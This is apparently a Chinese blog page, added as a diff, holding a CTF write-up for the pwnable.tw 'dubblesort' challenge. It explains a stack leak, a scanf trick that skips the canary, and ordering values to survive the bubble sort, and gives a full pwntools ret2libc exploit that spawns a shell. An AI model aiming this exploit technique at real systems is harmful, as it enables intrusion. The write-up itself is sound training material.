@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="manifest" href="/images/site.webmanifest">
+  <link rel="shortcut icon" href="/images/favicon.ico">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>pwnable.tw dubblesort | Y² 的博客</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="pwnable.tw dubblesort" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="难度不大的一关，而且网上有比我的做法更简单（但具有技巧性）的做法。 但是还是做了好久好久……不是耗在题目上，主要是耗在搞libc版本上。" />
+<meta property="og:description" content="难度不大的一关，而且网上有比我的做法更简单（但具有技巧性）的做法。 但是还是做了好久好久……不是耗在题目上，主要是耗在搞libc版本上。" />
+<link rel="canonical" href="http://localhost:4001/2022/08/06/pwnable-tw-dubblesort-writeup.html" />
+<meta property="og:url" content="http://localhost:4001/2022/08/06/pwnable-tw-dubblesort-writeup.html" />
+<meta property="og:site_name" content="Y² 的博客" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-08-06T15:49:02+08:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="pwnable.tw dubblesort" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-08-06T15:49:02+08:00","datePublished":"2022-08-06T15:49:02+08:00","description":"难度不大的一关，而且网上有比我的做法更简单（但具有技巧性）的做法。 但是还是做了好久好久……不是耗在题目上，主要是耗在搞libc版本上。","headline":"pwnable.tw dubblesort","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4001/2022/08/06/pwnable-tw-dubblesort-writeup.html"},"url":"http://localhost:4001/2022/08/06/pwnable-tw-dubblesort-writeup.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4001/feed.xml" title="Y² 的博客" /><script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+</head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">Y² 的博客</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">pwnable.tw dubblesort</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2022-08-06T15:49:02+08:00" itemprop="datePublished">Aug 6, 2022
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>难度不大的一关，而且网上有比我的做法更简单（但具有技巧性）的做法。
+但是还是做了好久好久……不是耗在题目上，主要是耗在搞libc版本上。</p>
+
+<h2 id="题目">题目</h2>
+
+<p>保护全开的i386程序。
+首先提示输入姓名，用read读取，并用 <code class="language-plaintext highlighter-rouge">printf("...%s...", buf)</code> 打印出来（这种形式没办法利用格式化字符串漏洞）。
+然后提示输入数组大小和数据，在循环中用 <code class="language-plaintext highlighter-rouge">scanf("%u", a[i])</code> 读取，数组大小无极限（但循环变量用寄存器表示，无法跳过某地址读写）。
+最后<strong>对数组进行冒泡排序</strong>，并将排序后的数组一个一个输出。</p>
+
+<!-- more -->
+
+<p>本题有两个漏洞：</p>
+
+<ol>
+  <li>read读取数据时不会自动补上 <code class="language-plaintext highlighter-rouge">\0</code>，所以打印的时候可以泄露一些栈上的数据。（但由于大小控制良好，无法栈溢出，无法泄露canary）</li>
+  <li>数组大小无极限，可以进行栈溢出。</li>
+</ol>
+
+<p>问题主要是：</p>
+
+<ol>
+  <li>栈上有哪些数据可供泄露？</li>
+  <li>如何应对canary？</li>
+  <li>如何让我的gadget在经过排序后仍旧待在正确的位置？</li>
+</ol>
+
+<h3 id="第一个问题泄露数据">第一个问题：泄露数据</h3>
+
+<p>由于这是俺第一次做提供了libc的题目，我前前后后摸索了很久。</p>
+
+<p>本题栈上数据有很多，我选择泄露libc里的一个地址。
+本地环境下，这个地址是GOT，然而在线环境下同一个位置的值变了，好在仍然是libc里的某地址，现场计算一下偏移仍然可以用：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvS</span><span class="p">())</span>
+<span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mi">4</span><span class="o">*</span><span class="mi">7</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x01</span><span class="s">'</span><span class="p">)</span>
+<span class="n">mes</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recvrepeat</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">mes</span><span class="p">[</span><span class="mi">34</span><span class="p">:</span><span class="mi">34</span><span class="o">+</span><span class="mi">4</span><span class="p">])</span><span class="o">-</span><span class="mh">0x1</span> <span class="o">-</span> <span class="n">libc_offset</span>
+<span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+</code></pre></div></div>
+
+<h3 id="第二个问题如何应对canary">第二个问题：如何应对canary</h3>
+
+<p>看网上大佬的wp，可以利用单个的”+”或者”-“来欺骗 <code class="language-plaintext highlighter-rouge">scanf("%u", a[i])</code> ，引发“读取成功但读个寂寞”的效果，这是因为scanf会将这俩当作数字的正负号来对待。
+这是一个技巧性很强的trick，我没有想到。我的方法是在读取数据循环到canary的位置的时候，输入一个任意非数字字符串（”stop”），由于程序没有写清空输入流的操作，所以包括该scanf之内的所有后续scanf都会跳过，引发“读取失败且读个寂寞”效果。</p>
+
+<p>采用这种方法，就可以在保留canary在栈上的情况下，通过之后的冒泡排序，将比canary大的数据移动到canary之后。
+但是缺点是canary之后的数据无法覆盖，只能想办法应付。</p>
+
+<h3 id="第三个问题如何应对利用冒泡排序">第三个问题：如何应对/利用冒泡排序</h3>
+
+<p>本题的冒泡排序将大的数字移到上边（地址高位），小的数据移到下面。
+采用上述的应对canary方法，有一些数据是无法进行覆盖的，排序的时候必须考虑这些已有数据。</p>
+
+<pre><code class="language-gdb">pwndbg&gt; stack 50
+00:0000│ esp 0xffffce30 —▸ 0xffffce4c ◂— 0x1
+01:0004│     0xffffce34 ◂— 0x1
+02:0008│     0xffffce38 ◂— 0x0
+03:000c│     0xffffce3c —▸ 0xf7ffdc08 —▸ 0xf7fd7000 ◂— jg     0xf7fd7047
+04:0010│     0xffffce40 —▸ 0xf7ffcd00 (_rtld_global_ro) ◂— 0x0
+05:0014│     0xffffce44 —▸ 0xffffcf6c —▸ 0xffffd184 ◂— 'HTTP_PROXY=http://192.168.21.1:7890/'
+06:0018│     0xffffce48 ◂— 0x1
+（以下为数组开始处）
+07:001c│     0xffffce4c ◂— 0x1
+08:0020│ edi 0xffffce50 —▸ 0xf7ffddd8 —▸ 0xf7ffdd64 —▸ 0xf7ffdc1c —▸ 0xf7ffdc08 ◂— ...
+09:0024│     0xffffce54 —▸ 0xffffcea0 ◂— 0x1
+0a:0028│     0xffffce58 ◂— 0x0
+... ↓        2 skipped
+0d:0034│     0xffffce64 —▸ 0xffffd151 ◂— '/home/nss/Desktop/pwnable.tw/dubblesort/dubblesort'
+0e:0038│     0xffffce68 —▸ 0xf7fcd000 ◂— 0x1afdb0
+0f:003c│     0xffffce6c ◂— 0x6b63614a ('Jack')
+10:0040│     0xffffce70 —▸ 0xffff0a79 ◂— 0x0
+11:0044│     0xffffce74 ◂— 0x2f /* '/' */
+12:0048│     0xffffce78 ◂— 0x50 /* 'P' */
+13:004c│     0xffffce7c —▸ 0xf7eac82f ◂— add    edi, 0x1207d1
+14:0050│     0xffffce80 ◂— 0x1
+15:0054│     0xffffce84 ◂— 0x8000
+16:0058│     0xffffce88 —▸ 0xf7fcd000 ◂— 0x1afdb0
+17:005c│     0xffffce8c —▸ 0x56555601 ◂— add    ebx, 0x199f
+18:0060│     0xffffce90 —▸ 0x565557a9 ◂— add    ebx, 0x17f7
+19:0064│     0xffffce94 —▸ 0x56556fa0 ◂— 0x1ea8
+1a:0068│     0xffffce98 ◂— 0x1
+1b:006c│     0xffffce9c —▸ 0x56555b72 ◂— add    edi, 1
+1c:0070│     0xffffcea0 ◂— 0x1
+1d:0074│     0xffffcea4 —▸ 0xffffcf64 —▸ 0xffffd151 ◂— '/home/nss/Desktop/pwnable.tw/dubblesort/dubblesort'
+1e:0078│     0xffffcea8 —▸ 0xffffcf6c —▸ 0xffffd184 ◂— 'HTTP_PROXY=http://192.168.21.1:7890/'
+（以下为canary以及无法覆盖的数据）
+1f:007c│     0xffffceac ◂— 0xadd66300
+20:0080│     0xffffceb0 —▸ 0xf7fcd3dc —▸ 0xf7fce1e0 ◂— 0x0
+21:0084│     0xffffceb4 —▸ 0xffffd14b ◂— 'i686'
+22:0088│     0xffffceb8 —▸ 0x56555b2b ◂— add    ebx, 0x1475
+23:008c│     0xffffcebc ◂— 0x0
+24:0090│     0xffffcec0 —▸ 0xf7fcd000 ◂— 0x1afdb0
+25:0094│     0xffffcec4 —▸ 0xf7fcd000 ◂— 0x1afdb0
+26:0098│ ebp 0xffffcec8 ◂— 0x0
+27:009c│     0xffffcecc —▸ 0xf7e35637 (__libc_start_main+247) ◂— add    esp, 0x10
+28:00a0│     0xffffced0 ◂— 0x1
+29:00a4│     0xffffced4 —▸ 0xffffcf64 —▸ 0xffffd151 ◂— '/home/nss/Desktop/pwnable.tw/dubblesort/dubblesort'
+2a:00a8│     0xffffced8 —▸ 0xffffcf6c —▸ 0xffffd184 ◂— 'HTTP_PROXY=http://192.168.21.1:7890/'
+2b:00ac│     0xffffcedc ◂— 0x0
+... ↓        2 skipped
+2e:00b8│     0xffffcee8 —▸ 0xf7fcd000 ◂— 0x1afdb0
+2f:00bc│     0xffffceec —▸ 0xf7ffdc04 ◂— 0x0
+30:00c0│     0xffffcef0 ◂— 0x1
+31:00c4│     0xffffcef4 ◂— 0x0
+</code></pre>
+
+<p>我把（栈上的）数据由小到大分为5类：</p>
+
+<ol>
+  <li>极小值：0或1</li>
+  <li>代码段：0x56xxxxxx</li>
+  <li>canary：随机，但可以假设大小在该位置</li>
+  <li>libc代码地址：0xf7xxxxxx，比如 <code class="language-plaintext highlighter-rouge">__libc_start_main</code></li>
+  <li>极大值：libc的got及以上的地址。（libc的RW段、程序的栈地址等）</li>
+</ol>
+
+<p>而ROP用到的gadget地址（<code class="language-plaintext highlighter-rouge">system</code> 和 <code class="language-plaintext highlighter-rouge">"/bin/sh"</code>）都位于4、5中间，也就是大于 <code class="language-plaintext highlighter-rouge">__libc_start_main</code>，小于libc的got。</p>
+
+<p>简单思考一下：极大值一定会排在最后，因此我们要达到的效果是（注意32位函数调用规则，地址后面是返回地址，然后才是函数参数）：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>esp+0x1c | 0, 1......
+...
+esp+0x78 | 0x56xxxxxxxx
+esp+0x7c | canary
+esp+0x80 | libc_start_main or libc_base or whatever （I just used system）
+...
+ebp+0x04 | system
+ebp+0x08 | system(ret_addr)
+ebp+0x0c | "/bin/sh\x00"
+esp+0x10 | big value like libc_got
+...
+</code></pre></div></div>
+
+<p>按照这个效果，进行一下不可控数据中极大值和极小值的配平（过程略），就可以计算出需要输入哪些数据。
+exp脚本如下：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span><span class="o">=</span><span class="s">'i386'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">log_level</span><span class="o">=</span><span class="s">'debug'</span>
+
+<span class="n">filename</span><span class="o">=</span><span class="s">"./dubblesort"</span>
+<span class="c1"># io = process([filename], env={"LD_PRELOAD":"./libc_32.so.6"})
+</span><span class="n">elf</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
+
+<span class="n">libc_name</span><span class="o">=</span><span class="s">"./libc_32.so.6"</span>
+<span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="n">libc_name</span><span class="p">)</span>
+
+<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'chall.pwnable.tw'</span><span class="p">,</span> <span class="mi">10101</span><span class="p">)</span>
+
+<span class="c1"># g = gdb.attach(io, """b *main+245
+# commands
+#  stack 50
+# end""")
+</span>
+<span class="k">def</span> <span class="nf">send_d</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+ <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">": "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">).</span><span class="n">encode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">))</span>
+
+<span class="n">libc_offset</span> <span class="o">=</span> <span class="mh">0x1b0000</span> <span class="o">-</span> <span class="mh">0x1e00</span>
+<span class="n">sys_offset</span> <span class="o">=</span> <span class="mh">0x3a940</span>
+<span class="n">sh_str_offset</span> <span class="o">=</span> <span class="mh">0x158e8b</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvS</span><span class="p">())</span>
+<span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mi">4</span><span class="o">*</span><span class="mi">7</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x01</span><span class="s">'</span><span class="p">)</span>
+<span class="n">mes</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recvrepeat</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">mes</span><span class="p">[</span><span class="mi">34</span><span class="p">:</span><span class="mi">34</span><span class="o">+</span><span class="mi">4</span><span class="p">])</span><span class="o">-</span><span class="mh">0x1</span> <span class="o">-</span> <span class="n">libc_offset</span>
+<span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+
+<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'43'</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">15</span><span class="p">):</span>
+ <span class="n">send_d</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">8</span><span class="p">):</span>
+ <span class="n">send_d</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">sys_offset</span><span class="p">)</span>
+<span class="n">send_d</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">sh_str_offset</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">": "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"stop"</span><span class="p">)</span>
+
+<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+  </div><div id="comments"></div>
+  <script>
+  new Valine({
+    el: "#comments",
+    app_id: "Ji5y9HTOlb2QGDO0XFlWXNRy-gzGzoHsz",
+    app_key: "6VqGye1352LX381YQDTOaiXs",
+    placeholder: "El Psy Congroo",
+  });
+</script>
+
+
+  <a class="u-url" href="/2022/08/06/pwnable-tw-dubblesort-writeup.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Y² 的博客</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Y² 的博客</li><li><a class="u-email" href="mailto:cameudis@gmail.com">cameudis@gmail.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/cameudis"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">cameudis</span></a></li><li><a href="https://www.twitter.com/cameudis"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">cameudis</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>料峭春风吹酒醒，微冷，山头斜照却相迎。回首向来萧瑟处，归去，也无风雨也无晴。</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
